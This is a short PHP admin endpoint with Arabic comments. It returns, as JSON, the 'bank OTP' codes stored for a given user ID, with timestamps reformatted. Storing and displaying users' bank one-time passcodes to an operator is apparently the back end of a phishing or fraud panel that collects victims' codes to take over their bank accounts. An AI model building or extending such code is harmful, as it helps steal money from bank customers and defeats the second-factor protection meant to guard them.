<?php
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    echo json_encode([]);
    exit;
}

require_once('init.php');

$userId = $_GET['user_id'] ?? null;

if (!$userId) {
    echo json_encode([]);
    exit;
}

// جلب رموز OTP البنك
$otps = $User->fetchBankOTPsByUserId($userId);

if ($otps) {
    // تنسيق التاريخ
    foreach ($otps as &$otp) {
        $timestamp = strtotime($otp->created_at . ' +3 hours');
        $otp->created_at = date('Y/m/d h:i A', $timestamp);
    }
    
    echo json_encode($otps);
} else {
    echo json_encode([]);
}
?>